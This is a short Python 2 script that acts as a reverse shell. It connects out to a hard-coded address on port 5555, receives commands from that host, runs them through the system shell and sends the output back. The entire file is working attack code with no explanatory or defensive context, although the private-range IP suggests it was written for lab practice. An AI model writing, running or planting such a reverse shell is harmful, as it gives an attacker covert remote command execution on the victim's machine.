#!/usr/bin/python

import subprocess
import socket
import os

#target = raw_input("What is the target IP: ")
#port = int(raw_input("What is the port number: "))


client = socket.socket()
client.connect(("192.168.1.132",5555))


def reverse_shell(command):

    command = command.rstrip()

    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Execution failed. \r\n"
    return output


while True:

       
    cmd = client.recv(1024)
    if "cd" in cmd:
	os.chdir(cmd[3:])
	client.send("ok")
    else:
	command = reverse_shell(cmd)
	if len(command) < 1:
		client.send("nothing")
	else:
		client.send(command)
	
    



